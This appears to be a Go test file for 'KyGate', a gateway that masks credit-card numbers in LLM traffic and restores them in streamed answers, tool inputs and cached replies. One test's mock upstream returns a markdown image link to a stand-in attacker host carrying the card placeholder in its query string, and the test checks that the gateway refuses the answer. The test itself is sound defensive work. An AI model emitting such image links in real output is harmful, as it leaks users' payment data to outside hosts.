package pipeline_test

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"testing"
)

// With output inspection on, an answer KyGate cannot read is refused, never
// passed on unchecked.
func TestUnreadableAnswerIsNotPassedOnUnchecked(t *testing.T) {
	h := newHarness(t, "") // the starter policy inspects answers
	h.useUpstream(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		fmt.Fprint(w, "![x](https://evil.example/c.png?d=[CREDIT_CARD_1])")
	})
	resp, body := h.post("/v1/chat/completions", h.keyA, chat("card "+cardA, false))
	if resp.StatusCode != 502 || strings.Contains(body, "evil.example") || strings.Contains(body, cardA) {
		t.Fatalf("%d %s", resp.StatusCode, body)
	}
}

// A stream that stops in the middle of a block keeps the text held back for a
// placeholder that might have been split.
func TestCutStreamKeepsHeldText(t *testing.T) {
	h := newHarness(t, "")
	h.useUpstream(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		send := func(ev string, v any) {
			b, _ := json.Marshal(v)
			fmt.Fprintf(w, "event: %s\ndata: %s\n\n", ev, b)
		}
		send("message_start", map[string]any{"type": "message_start", "message": map[string]any{"id": "m", "type": "message", "role": "assistant", "model": "claude-opus-5-5", "content": []any{}, "usage": map[string]any{"input_tokens": 1, "output_tokens": 1}}})
		send("content_block_start", map[string]any{"type": "content_block_start", "index": 0, "content_block": map[string]any{"type": "text", "text": ""}})
		for _, piece := range []string{"Card [CREDIT_CA", "RD_1] ok [CRE"} {
			send("content_block_delta", map[string]any{"type": "content_block_delta", "index": 0, "delta": map[string]any{"type": "text_delta", "text": piece}})
		}
		// No content_block_stop, no message_stop: the provider went away.
	})
	_, body := h.post("/v1/messages", h.keyA, messages("pay "+cardA, true))
	if got := streamText(t, body, true); got != "Card "+cardA+" ok [CRE" {
		t.Fatalf("%q", got)
	}
}

// A custom tool's input is free text: real values are put back in it, as in
// a function's arguments, streamed or not, and from the cache.
func TestCustomToolInputIsRehydrated(t *testing.T) {
	h := newHarness(t, "")
	h.useUpstream(func(w http.ResponseWriter, r *http.Request) {
		var req map[string]any
		json.NewDecoder(r.Body).Decode(&req)
		call := func(input any) map[string]any {
			return map[string]any{"index": 0, "id": "call_1", "type": "custom", "custom": map[string]any{"name": "shell", "input": input}}
		}
		if req["stream"] != true {
			json.NewEncoder(w).Encode(map[string]any{"id": "c1", "object": "chat.completion", "created": 1, "model": "gpt-4o-mini",
				"choices": []any{map[string]any{"index": 0, "finish_reason": "tool_calls", "message": map[string]any{"role": "assistant", "content": nil,
					"tool_calls": []any{call("pay [CREDIT_CARD_1] now")}}}}})
			return
		}
		w.Header().Set("Content-Type", "text/event-stream")
		send := func(delta map[string]any, finish any) {
			b, _ := json.Marshal(map[string]any{"id": "c1", "object": "chat.completion.chunk", "model": "gpt-4o-mini",
				"choices": []any{map[string]any{"index": 0, "delta": delta, "finish_reason": finish}}})
			fmt.Fprintf(w, "data: %s\n\n", b)
		}
		send(map[string]any{"role": "assistant", "tool_calls": []any{call("pay [CREDIT_C")}}, nil)
		send(map[string]any{"tool_calls": []any{map[string]any{"index": 0, "custom": map[string]any{"input": "ARD_1] now"}}}}, nil)
		send(map[string]any{}, "tool_calls")
		fmt.Fprint(w, "data: [DONE]\n\n")
	})
	tools := func(stream bool) map[string]any {
		m := chat("pay with "+cardA, stream)
		m["tools"] = []any{map[string]any{"type": "custom", "custom": map[string]any{"name": "shell", "description": "runs a command"}}}
		return m
	}
	_, body := h.post("/v1/chat/completions", h.keyA, tools(true))
	var input strings.Builder
	for _, line := range strings.Split(body, "\n") {
		if !strings.HasPrefix(line, "data: {") {
			continue
		}
		var chunk map[string]any
		json.Unmarshal([]byte(line[6:]), &chunk)
		for _, c := range chunk["choices"].([]any) {
			delta, _ := c.(map[string]any)["delta"].(map[string]any)
			for _, tc := range asList(delta["tool_calls"]) {
				if cu, ok := tc.(map[string]any)["custom"].(map[string]any); ok {
					s, _ := cu["input"].(string)
					input.WriteString(s)
				}
			}
		}
	}
	if input.String() != "pay "+cardA+" now" {
		t.Fatalf("streamed input %q", input.String())
	}
	// The answer was stored from the stream: a plain request is served from
	// the cache, with the value put back.
	resp, body := h.post("/v1/chat/completions", h.keyB, tools(false))
	if resp.Header.Get("X-KyGate-Cache") != "hit" || !strings.Contains(body, `"input":"pay `+cardA+` now"`) {
		t.Fatalf("%q %s", resp.Header.Get("X-KyGate-Cache"), body)
	}
}

func asList(v any) []any {
	l, _ := v.([]any)
	return l
}
